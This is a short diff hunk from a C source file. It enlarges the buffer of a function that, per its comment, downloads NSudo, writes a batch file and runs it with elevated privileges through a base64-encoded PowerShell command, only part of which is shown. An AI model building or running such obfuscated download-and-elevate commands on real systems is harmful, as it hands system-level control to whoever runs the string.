@@ -443,7 +443,7 @@ char* sys_get_nsudo(void) {
    Uses TOILET_PAPER-style technique: download NSudo, write a batch file, run it via NSudo cmd /c.
    Returns a ready-to-run command string. */
 char* sys_easy_mode_tp(void) {
-    static char result[4096];
+    static char result[8192];
     const char *encoded =
         "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMA"
         "dQBkAG8AJwAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAA"
